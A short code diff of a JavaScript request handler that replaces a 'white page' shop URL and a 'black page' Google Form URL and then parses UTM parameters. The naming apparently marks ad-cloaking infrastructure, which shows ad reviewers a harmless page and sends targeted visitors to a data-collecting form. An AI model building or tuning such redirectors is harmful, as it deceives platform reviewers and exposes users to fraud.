@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://valkayogashop.com/products/yoga-mat-chakra";
-    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSfwBcqMDMglIuTlk6IgIjMg0W322bwgPBVa-stq5Vs0mZEhGA/viewform?usp=dialog";
+    const whitePageURL = "https://marielvogueboutique.com/products/italia-serum";
+    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSfz6yICXH1qgKJIClsyqOKfekGjbGhOjisKfW9jPDROSwMqVQ/viewform?usp=dialog";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
